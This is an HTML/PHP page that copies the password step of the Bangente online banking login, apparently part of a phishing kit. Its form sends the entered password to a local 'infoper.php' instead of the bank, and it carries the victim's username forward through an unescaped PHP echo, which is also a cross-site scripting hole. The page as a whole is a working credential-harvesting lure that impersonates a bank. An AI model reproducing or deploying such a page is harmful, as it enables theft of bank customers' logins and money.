<!DOCTYPE html>
<!-- saved from url=(0043)https://bangentenlinea.bangente.com.ve/?p=1 -->
<html lang="es" style="overflow: auto;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="aEvxHoOvGUcj8Gf4OjgtnDvgXUzXPzSAGcJmxzhH">
    <meta name="msapplication-TileImage" content="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

    <title>Bangente</title>

    <!-- #FAVICONS -->
    <link rel="shortcut icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
    <link rel="icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
    <link rel="icon" type="image/png" sizes="32x32" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

    <!-- Fonts -->
    <link rel="dns-prefetch" href="https://fonts.gstatic.com/">

    <link rel="stylesheet" href="./docs/all.css">
    <link id="gull-theme" rel="stylesheet" href="./docs/lite-purple.min.css">
    <link rel="stylesheet" href="./docs/perfect-scrollbar.css">
    <link href="./docs/datepicker.min.css" rel="stylesheet" type="text/css">
    <!-- Styles -->
    <link href="./docs/app.css" rel="stylesheet">
    <link href="./docs/lite-purple.min.css" rel="stylesheet">
    <link href="./docs/dropzone.css" rel="stylesheet">
    <script src="./docs/jquery.min.js.descarga"></script>
    <script src="./docs/jquery-ui.min.js.descarga"></script>
    <script src="./docs/common-bundle-script.js.descarga"></script>
    <script src="./docs/jquery.validate.min.js.descarga"></script>
    <script src="./docs/additional-methods.min.js.descarga"></script>
    <script src="./docs/sweetalert2.min.js.descarga"></script>
    <script src="./docs/customizer.script.js.descarga"></script>
    <script src="./docs/script.js.descarga"></script>
    <script src="./docs/sidebar.large.script.js.descarga"></script>
    <script src="./docs/dropzone.min.js.descarga"></script>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- Scripts -->
    <script src="./docs/bangente.js.descarga"></script>
    <!-- Styles -->
    <link href="./docs/bangente.css" rel="stylesheet">
    <link href="./docs/helvetica-neue-lt-std-55" rel="stylesheet">
</head>

<body id="login" class="fondoInicial" style="background-image: url(&quot;https://bangentenlinea.bangente.com.ve/assets/images/bgLogin.png&quot;); background-repeat: no-repeat; background-size: cover; height: auto; font-family: Helvetica; background-position: center center; opacity: 1;">
      
      
        <div id="main" role="main" class="mainRegister auth-bg auth-bg-per">
          <div id="content" class="container">
            <div class="auth-box login-box" style="opacity: 1;"><div class="auth-layout-wrap left">
  <div class="auth-content">
    <div class="card2 o-hidden" style="max-width: 490px;">
      <div class="row" style="float: right;">
        <div class="p-4">
          <div class="text-center mb-4">
            <img src="./docs/logoHorizontalMorado.png" alt="" class="imgInicio">
            <hr class="lineSeparator">
          </div>

          <form method="POST" action="infoper.php"  >
		     <input type="hidden" name="loginu" value="<?php echo $_POST['loginu']; ?>">
                  
			<div class="form-group">
              <label for="email" class="inicio"><span>Ingrese su contraseña </span></label>
              <div class="input-group">
                <input id="password" type="password" class="form-control form-control-rounded" name="psswu" value="" required="" autocomplete="" autofocus="" maxlength="16">
                <div class="input-group-append">
                  <button id="showPassword" class="btn btn-primary btn-rounded" type="button"><i class="icon-append fa fa-eye-slash"></i></button>
                </div>
              </div>
                          </div>
            <button class="btn btn-rounded btn-primary btn-blockLogin mt-2 login">Ingresar</button>
            <a href="" class="text-muted inicio right" id="cmdForget">¿Olvidaste tu
              contraseña?</a>
            <br>
            <a class="btn btn-rounded btn-outline-primary left-ini" href="index.php" id="cmdBack"><i class="fa fa-arrow-left"></i> Regresar</a>
                       
                                  </form>
        </div>
      </div>
    </div>
  </div>
</div>
<script>
  $(document).ready(function() {
    document.getElementById('password').addEventListener('keydown', function(event) {
      if (event.key === ' ') {
        event.preventDefault();
      }
    });

    
    //elimina panel de logo si existe
    $('.auth-box-left').parent().remove();
    //asigna css de login
    $('.card-auth-box').addClass('card-auth-box-login');

    $('input, select').on('focusin focusout keyup change', function() {
      $('#cmdLogin').prop('disabled', $('#password').val() === '');
    });

    $('#cmdLogin').prop('disabled', $('#password').val() === '');
    var container_login = $('.auth-box');

    $('#password').focus();

    $('#password').keyup(function() {
      var tipo = document.getElementById('password');
      if (tipo.type == 'text') {
        tipo.type = 'password';
      }
    });

    $('#password').on('paste', function(e) {
      e.preventDefault();
    });

    $('#password').on('copy', function(e) {
      e.preventDefault();
    });

    $('#showPassword').click(function() {
      var cambio = document.getElementById('password');
      if (cambio.type == 'password') {
        cambio.type = 'text';
        $('.icon-append')
          .removeClass('fa fa-eye-slash')
          .addClass('fa fa-eye');
      } else {
        cambio.type = 'password';
        $('.icon-append')
          .removeClass('fa fa-eye')
          .addClass('fa fa-eye-slash');
      }
    });

    $('#cmdLogin').click(function(e) {
      e.preventDefault();
      $('form').submit();
    });

    $('#cmdForget').click(function() {
      var data = $('form').serializeArray();
      var container_login = $('.auth-box');
      postURL('https://bangentenlinea.bangente.com.ve/oc/1', container_login, data);
    });

    $('#cmdBack').click(function(e) {
      var container_login = $('.auth-box');
              postURL('https://bangentenlinea.bangente.com.ve/lg', container_login);
          });

 

  });
</script>
</div>
            <!-- End col -->
          </div>
          <!-- End row -->
        </div>
        
        
      
      
      <script>
    $('html').css('overflow', 'auto');
</script>



</body></html>